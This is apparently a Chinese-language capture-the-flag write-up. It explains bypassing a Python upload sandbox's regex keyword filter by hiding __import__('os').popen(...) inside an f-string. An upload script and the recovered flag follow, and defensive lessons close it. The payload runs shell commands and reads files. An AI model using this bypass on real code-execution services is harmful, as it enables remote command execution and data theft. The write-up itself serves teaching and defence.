# outdated

## 题目简述

网站接受 Python 文件，先用 AST 确认语法合法，再通过正则“清除字符串和注释”，最后在剩余文本中屏蔽 `import`、`open`、`eval`、`exec`、`__import__` 等关键词。审核通过后，服务器却运行原始上传文件。过滤器对 f-string 的理解与 Python 解释器不同。

## 解题过程

`clean_comments_and_strings` 会把整个 f-string 当作普通字符串删除，因此看不到 `{...}` 中的表达式；Python 运行时则会执行大括号里的代码。提交：

```python
print(f'{__import__("os").popen("ls | grep flag | xargs cat").read()}')
```

原始代码能通过 `ast.parse`，没有真正的 `import` 语句；清洗后的检查文本也不含被禁词。执行时 f-string 表达式调用 `__import__`，通过 shell 找到启动脚本随机改名后的 `flag-<uuid>.txt` 并读取。

上传复现：

```python
import requests

with open("payload.py", "rb") as payload:
    response = requests.post(
        "https://TARGET/submit", files={"file": payload}, timeout=10
    )
print(response.text)
```

页面输出包含：

```text
tjctf{oops_bad_filter_3b582f74}
```

## 方法总结

- 安全检查与执行必须基于同一语法树；用正则删除字符串无法正确处理 f-string、转义、拼接和多行语法。
- “运行原始代码、检查清洗副本”天然产生解析差异，攻击者只需找到两种视图不一致的语法结构。
- 不可信 Python 不应靠关键词黑名单沙箱化；应放入最小权限、无秘密、隔离网络和文件系统的执行环境。
